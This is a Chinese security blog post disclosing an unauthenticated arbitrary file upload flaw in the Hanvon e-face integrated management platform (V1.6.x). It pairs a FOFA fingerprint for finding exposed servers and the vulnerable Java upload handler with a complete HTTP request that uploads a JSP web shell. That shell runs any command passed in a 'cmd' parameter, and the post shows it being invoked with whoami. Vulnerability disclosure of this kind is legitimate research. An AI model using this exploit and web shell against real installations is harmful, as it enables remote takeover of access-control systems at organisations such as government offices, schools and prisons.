---
title: "汉王e脸通综合管理平台 monadFileUpload.do 任意文件上传漏洞"
source: https://mrxn.net/jswz/hanvon-efacego-monadFileUpload-upload-rce.html
asset_dir: assets/汉王e脸通综合管理平台-monadfileupload.do-任意文件上传漏洞
---

# 汉王e脸通综合管理平台 monadFileUpload.do 任意文件上传漏洞

[Mrxn](https://mrxn.net/author/1)- 发表于2025/7/13 08:24
- 1321浏览
- [0评论](#comment)
- 47分钟阅读

深入探索

计算机安全

VPN服务

安全研究报告

---

# 漏洞简介

汉王e脸通综合管理平台是汉王公司研发的一款基于生物识别技术的智慧园区管理[软件](#)，集成了考勤管理、门禁管理、访客管理、巡更管理、消费管理、车控管理、梯控管理、人事管理等多个模块，广泛应用于政府、企业、监狱、学校、智慧社区等多个领域，实现无接触式快速通行，提升管理效率和安全性。其管理平台的 `monadFileUpload.do` 接口存在任意[文件上传漏洞](https://mrxn.net/tag/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0)。攻击者可在无需认证的情况下，通过向该接口上传恶意文件，实现任意文件上传，进而可能导致[远程代码执行](https://mrxn.net/tag/rce)或服务器被控制，严重威胁系统安全。

漏洞预警服务

# 影响版本

V1.6.x

# fofa语法

> icon\_hash="1380907357"
>
> 物流软件安全

# 漏洞分析

看下 `LeaveListController` 的关于 `monadFileUpload.do` 的实现

```
@ResponseBody
    @RequestMapping(
        value = {"/monadFileUpload.do"},
        method = {RequestMethod.POST}
    )
    public RequestJson monadFileUpload(@RequestParam MultipartFile file, @RequestParam(required = false,value = "type") Integer type, @RequestParam(required = false,value = "deviceType") String deviceType) {
        RequestJson result = new RequestJson();

        String imagePath;
        String name;
        try {
            CommonsMultipartFile cf = (CommonsMultipartFile)file;
            DiskFileItem fi = (DiskFileItem)cf.getFileItem();
            File f = fi.getStoreLocation();
            SimpleDateFormat fmt = new SimpleDateFormat("yyyy-MM-dd");
            String format = fmt.format(new Date());
            name = file.getOriginalFilename();
            imagePath = this.saveImageFile(f, name, format, type, deviceType);
        } catch (Exception e) {
            e.printStackTrace();
            return RequestJson.errorResult(result, e.getMessage());
        }

        return RequestJson.successResult(result, imagePath, name);
    }

    public String saveImageFile(File fileObj, String fileName, String dirName, Integer type, String deviceType) throws Exception {
        if (fileObj == null) {
            return null;
        } else if (!fileObj.isFile()) {
            throw new Exception(getMessage("personnel_user_upload_file_formal_error2"));
        } else {
            long length = fileObj.length();
            if (length <= 0L) {
                throw new Exception(getMessage("personnel_user_upload_file_formal_error3"));
            } else if (length > 10485760L) {
                throw new Exception("图片文件不能超过10MB！当前文件大小：" + length / 1048576L + "MB");
            } else {
                if (type != null) {
                    this.VerifyThePixel(fileObj, deviceType);
                }

                String postfix = fileName.substring(fileName.lastIndexOf("."));
                String photoDir = "resource" + File.separator + dirName;
                return Utils.saveFile(photoDir, postfix, fileObj);
            }
        }
    }

    public boolean VerifyThePixel(File file, String deviceType) throws Exception {
        BufferedImage bi = null;

        try {
            bi = ImageIO.read(file);
        } catch (IOException var6) {
            throw new Exception("获取图片像素异常");
        }

        int width = bi.getWidth();
        int height = bi.getHeight();
        if (!deviceType.equals("H0810") && !deviceType.equals("M0816") && !deviceType.equals("M0816S") && !deviceType.equals("M0816Z")) {
            if (!deviceType.equals("M0710S") && !deviceType.equals("M0710Z")) {
                if (!deviceType.equals("L0515S") && !deviceType.equals("L0515Z")) {
                    if ((deviceType.equals("L0510S") || deviceType.equals("L0510S")) && (width != 720 || height != 1280)) {
                        throw new Exception("白玉的轮播图需要的像素为1280*720");
                    }
                } else if (width != 1280 || height != 720) {
                    throw new Exception("翡翠的轮播图需要的像素为720*1280");
                }
            } else if (width != 600 || height != 1024) {
                throw new Exception("青玉的轮播图需要的像素为1024*600");
            }
        } else if (width != 800 || height != 1280) {
            throw new Exception("钻石琥珀的轮播图需要的像素为1280*800");
        }

        return true;
    }
```

上传原始文件名直接带入 `saveImageFile` 方法中后，通过小数点分割文件名获取后缀作为 `postfix` 再带入 *`saveFile`* 方法在保存*，*全程无过滤和校验，造成任意[文件上传漏洞](https://mrxn.net/tag/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0)。

# 漏洞复现

```
POST /manage/leaveList/monadFileUpload.do?recoToken=67mds2pxXQb&type= HTTP/1.1
Host: hanvon.mrxn.net
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryFfJZ4PlAZBixjELj

------WebKitFormBoundaryFfJZ4PlAZBixjELj
Content-Disposition: form-data; name="file"; filename="1.jsp"
Content-Type: image/jpeg

<% java.io.InputStream in = Runtime.getRuntime().exec(request.getParameter("cmd")).getInputStream();int a = -1;byte[] b = new byte[2048];out.print("<pre>");while((a=in.read(b))!=-1){out.println(new String(b,0,a));}out.print("</pre>");new java.io.File(application.getRealPath(request.getServletPath())).delete();%>
------WebKitFormBoundaryFfJZ4PlAZBixjELj--
```

访问文件执行命令 `/manage/resource/2025-xx-xx/xxxxx.jsp?cmd=whoami`

[![汉王e脸通综合管理平台 monadFileUpload.do 任意文件上传漏洞](images/img-001-b84802d3e8f0.webp)](https://image.mrxn.net/d6d359b1ef9642aaa8dded509ab0ebfc.webp)

成功得到 `whoami` [命令执行](https://mrxn.net/tag/rce)结果

- 标签：
- [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
- [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
- [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
- [#Java](https://mrxn.net/tag/Java)
- [#rce](https://mrxn.net/tag/rce)
- [#文件上传](https://mrxn.net/tag/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0)

---

文章目录

- [1.漏洞简介](#toc-1-)
- [2.影响版本](#toc-2-)
- [3.fofa语法](#toc-3-)
- [4.漏洞分析](#toc-4-)
- [5.漏洞复现](#toc-5-)

  
  

![](data:image/png;base64,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)

手机扫码阅读
